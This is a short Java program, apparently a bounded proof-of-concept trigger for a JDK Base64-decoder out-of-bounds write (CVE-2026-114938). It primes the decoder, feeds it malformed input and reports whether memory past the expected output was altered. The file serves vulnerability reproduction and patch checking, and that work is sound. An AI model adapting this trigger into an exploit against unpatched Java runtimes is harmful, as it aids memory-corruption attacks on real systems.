import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/** Bounded standalone trigger: every write stays inside a real 4096-byte array.
 *  CVE-2026-114938 (Java4Shell) PoC from calif.io. On an affected JDK prints REPRODUCED.
 *  NOTE: requires x86-64 CPU with AVX-512 VBMI; on old JDK 17 builds pass block=128. */
public final class Base64Trigger {
    private static volatile int sink;

    public static void main(String[] args) {
        int block = args.length > 0 ? Integer.parseInt(args[0]) : 64; // JDK17 vecchi: 128
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = "A".repeat(block).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = ("A".repeat(block) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[4096];
        for (int i = 0; i < 200_000; i++) {
            sink += decoder.decode(valid, target);
        }
        Arrays.fill(target, (byte) 0x5a);
        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }
        int changed = 0, first = -1, last = -1;
        int start = (block == 64) ? 50 : 96;
        for (int i = start; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }
        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.printf("rejected=%s changed=%d first=%d last=%d%n", rejected, changed, first, last);
        if (!rejected) { System.err.println("NOT REPRODUCED (input accettato)"); System.exit(1); }
        if (changed == 0) { System.err.println("NOT REPRODUCED (nessuna corruzione osservata)"); System.exit(1); }
        System.out.println("REPRODUCED (OOB write osservata)");
    }
}
